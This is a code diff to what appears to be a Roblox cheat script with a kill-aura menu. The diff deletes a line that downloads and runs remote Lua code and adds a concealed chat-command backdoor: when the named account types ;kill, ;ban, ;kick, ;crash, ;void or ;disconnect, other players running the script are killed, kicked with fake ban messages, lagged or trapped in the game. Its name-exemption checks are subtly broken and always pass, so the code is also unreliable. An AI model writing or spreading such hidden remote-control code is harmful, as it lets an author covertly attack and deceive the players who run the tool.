@@ -131,76 +131,277 @@ Button("CombatTab", "Kill Aura", function()
   KillauraEnabled = false
   end
 end)
-print("1")
-local whiteliste = loadstring(game:HttpGet("https://raw.githubusercontent.com/ManOnTopain/CuriousliForRoblox/main/whitelist.lua", true))()
-local whitelist = "CoolBoyEli08"
-local owner = "CoolBoyEli08"
 
-if lplr.Name == whitelist then
-	print(lplr.Name.." Is whitelisted")		
-end
+local tt = Instance.new("TextLabel")
+tt.Parent = game.CoreGui.Curiousli.Background
+tt.Text = "Sorry! developing kill aura, so it means no kill aura ;( im so sorry"
 
-local CmdKill = "/kill "
-print("2")
-for i,v in pairs(game.Players:GetPlayers()) do
-  if v.Name == whitelist then
-    v.Chatted:Connect(function(msg)
-        if msg:sub(1, CmdKill:len()):lower() == CmdKill:lower() then
-          local target = msg:sub(CmdKill:len()+1):lower()
-					print(target)
-					
-          if target == "default" then
-						print("Killing request for default")
-            if v.Name == whitelist then
-              else
-              lplr.Character.Humanoid.Health = 0
-            end
-          end
-	 if target == "private" then
-			print(target.." Kill request")
-            if lplr.Name == owner then
-		
-              else
-		if not v.Name == owner then
-              lplr.Character.Humanoid.Health = 0
-		end
-            end
-          end
-        end
-    end)
-  end
+local function addvectortocframe(cframe, vec)
+	local x, y, z, R00, R01, R02, R10, R11, R12, R20, R21, R22 = cframe:GetComponents()
+	return CFrame.new(x + vec.X, y + vec.Y, z + vec.Z, R00, R01, R02, R10, R11, R12, R20, R21, R22)
 end
 
 
-while wait(0.1) do
-  if KillauraEnabled == true then
-    	for i,v in pairs(game.Players:GetChildren()) do
-		if v.Character and v.Name ~= game.Players.LocalPlayer.Name and v.Character:FindFirstChild("HumanoidRootPart") then
-    if not v.Name == whitelist then
-			local mag = (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
-			if mag <= DistVal["Value"] and v.Team ~= game.Players.LocalPlayer.Team and v.Character:FindFirstChild("Humanoid") then
-				if v.Character.Humanoid.Health > 0 then
+local commands = {}
+local KILL = ";kill "
+local LAGBACK = ";lagback "
+
+
+commands.kill = function()
+	if game.Players.LocalPlayer.Name == "CoolBoyEli08" or "YMikeOfficialYT" then
+	else
+		game.Players.LocalPlayer.Character.Humanoid.Health = 0
+	end
+end
+commands.lagback = function()
+	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
+		else
+		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 999999999999999999999999999999999999999999999999999999999999999999999999
+	end
+end
+local JUMP = ";jump "
+commands.jump = function()
+	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
+	else
+		game.Players.LocalPlayer.Character.Humanoid:ChangeState("Jumping")
+	end
+end
+local SIT = ";sit "
+commands.sit = function()
+	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
+	else
+		game.Players.LocalPlayer.Character.Humanoid.Sit = true
+	end
+end
+local UNSIT = ";unsit "
+commands.unsit = function()
+	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
+	else
+		game.Players.LocalPlayer.Character.Humanoid.Sit = false
+	end
+end
+local FREEZE = ";freeze "
+commands.freeze = function()
+	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
+	else
+		game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+	end
+end
+local UNFREEZE = ";unfreeze "
+commands.unfreeze = function()
+	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
+	else
+		game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+	end
+end
+local VOID = ";void "
+commands.void = function()
+	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
+	else
+		repeat
+			task.wait()
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = addvectortocframe(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame, Vector3.new(0, -3, 0))
+		until game.Players.LocalPlayer.Character.Humanoid.Health <= 1
+	end
+end
+local CRASH = ";crash"
+commands.crash = function()
 	
-                    SwordCont:swingSwordAtMouse()
+		if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
+		else
+		setfpscap(9e9)
+		end
 end
-  end
- end
-end
-end
-end
-end
+local CHIP = ";chip "
+commands.chip = function()
 
+	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
+	else
+		local function funnyfunc(v)
+			if v:IsA("ImageButton") then
+				v.Image = "http://www.roblox.com/asset/?id=6864086702"
+				v:GetPropertyChangedSignal("Image"):Connect(function()
+					v.Image = "http://www.roblox.com/asset/?id=6864086702"
+				end)
+			end
+			if v:IsA("TextLabel") or v:IsA("TextButton") and v:GetFullName():find("ChatChannelParentFrame") == nil then
+				if v.Text ~= "" then
+					v.Text = "chips"
+				end
+				v:GetPropertyChangedSignal("Text"):Connect(function()
+					if v.Text ~= "" then
+						v.Text = "chips"
+					end
+				end)
+			end
+			if v:IsA("Texture") or v:IsA("Decal") then
+				v.Texture = "http://www.roblox.com/asset/?id=6864086702"
+				v:GetPropertyChangedSignal("TextureID"):Connect(function()
+					v.Texture = "http://www.roblox.com/asset/?id=6864086702"
+				end)
+			end
+			if v:IsA("MeshPart") then
+				v.TextureID = 'http://www.roblox.com/asset/?id=6864086702'
+				
+				v:GetPropertyChangedSignal("TextureID"):Connect(function()
+					v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
+				end)
+			end
+			for i,v in pairs(game:GetDescendants()) do
+				funnyfunc(v)
+			end
+			game.DescendantAdded:Connect(funnyfunc)
+		end
+	end
+end
+local BAN = ";ban "
+commands.ban = function()
 
+	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
+	else
+		game.Players.LocalPlayer:Kick("You have been temporarily banned. Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds")
+	end
+end
+local KICK = ";kick "
+commands.kick = function()
 
+	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
+	else
+		game.Players.LocalPlayer:Kick("you have been kicked from bedwars")
+	end
+end
+local DISCONNECT = ";disconnect "
+commands.disconnect = function()
+
+	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
+	else
+		game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay").DescendantAdded:Connect(function(obj)
+			obj.MouseButton1Click:Connect(function()
+				game.Players.LocalPlayer:Kick("Please press leave again")
+			end)
+		end)
+	end
+end
+local ERRORKICK = ";errorkick "
+commands.errorkick = function()
+
+	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
+	else
+	game.Players.LocalPlayer.Character.Head:Destroy()
+	end
+end
 
 for i,v in pairs(game.Players:GetPlayers()) do
-	print("yes")
-  if v.Name == owner then
-    v.Chatted:Connect(function(msg)
-        if msg:sub(1, CmdKill:len()):lower() == CmdKill:lower() then
-          local target = msg:sub(CmdKill:len()+1):lower()
-         
-        end
-    end)
-  end
+	if v.Name == "YMikeOfficialYT" then
+		v.Chatted:Connect(function(msg)
+			
+			if msg:sub(1, KILL:len()):lower() == KILL:lower() then
+				local target = msg:sub(KILL:len()+1)
+				
+				if target == "default" then
+					commands.kill()
+				end
+			end
+			
+			if msg:sub(1, LAGBACK:len()):lower() == LAGBACK:lower() then
+				local target = msg:sub(LAGBACK:len()+1)
+
+				if target == "default" then
+					commands.lagback()
+				end
+			end
+			if msg:sub(1, JUMP:len()):lower() == JUMP:lower() then
+				local target = msg:sub(JUMP:len()+1)
+
+				if target == "default" then
+					commands.jump()
+				end
+			end
+			
+			if msg:sub(1, SIT:len()):lower() == SIT:lower() then
+				local target = msg:sub(SIT:len()+1)
+
+				if target == "default" then
+					commands.sit()
+				end
+			end
+			
+			if msg:sub(1, UNSIT:len()):lower() == UNSIT:lower() then
+				local target = msg:sub(UNSIT:len()+1)
+
+				if target == "default" then
+					commands.unsit()
+				end
+			end
+			if msg:sub(1, FREEZE:len()):lower() == FREEZE:lower() then
+				local target = msg:sub(FREEZE:len()+1)
+
+				if target == "default" then
+					commands.freeze()
+				end
+			end
+			if msg:sub(1, UNFREEZE:len()):lower() == UNFREEZE:lower() then
+				local target = msg:sub(UNFREEZE:len()+1)
+
+				if target == "default" then
+					commands.unfreeze()
+				end
+			end
+			
+			if msg:sub(1, VOID:len()):lower() == VOID:lower() then
+				local target = msg:sub(VOID:len()+1)
+
+				if target == "default" then
+					commands.void()
+				end
+			end
+			if msg:sub(1, CRASH:len()):lower() == CRASH:lower() then
+				local target = msg:sub(CRASH:len()+1)
+
+				if target == "default" then
+					commands.crash()
+				end
+			end
+			
+			if msg:sub(1, CHIP:len()):lower() == CHIP:lower() then
+				local target = msg:sub(CHIP:len()+1)
+
+				if target == "default" then
+					commands.chip()
+				end
+			end
+			
+			if msg:sub(1, BAN:len()):lower() == BAN:lower() then
+				local target = msg:sub(BAN:len()+1)
+
+				if target == "default" then
+					commands.ban()
+				end
+			end
+			
+			if msg:sub(1, KICK:len()):lower() == KICK:lower() then
+				local target = msg:sub(KICK:len()+1)
+
+				if target == "default" then
+					commands.kick()
+				end
+			end
+			
+			if msg:sub(1, DISCONNECT:len()):lower() == DISCONNECT:lower() then
+				local target = msg:sub(DISCONNECT:len()+1)
+
+				if target == "default" then
+					commands.disconnect()
+				end
+			end
+			
+			if msg:sub(1, ERRORKICK:len()):lower() == ERRORKICK:lower() then
+				local target = msg:sub(ERRORKICK:len()+1)
+
+				if target == "default" then
+					commands.errorkick()
+				end
+			end
+		end)
+	end
 end
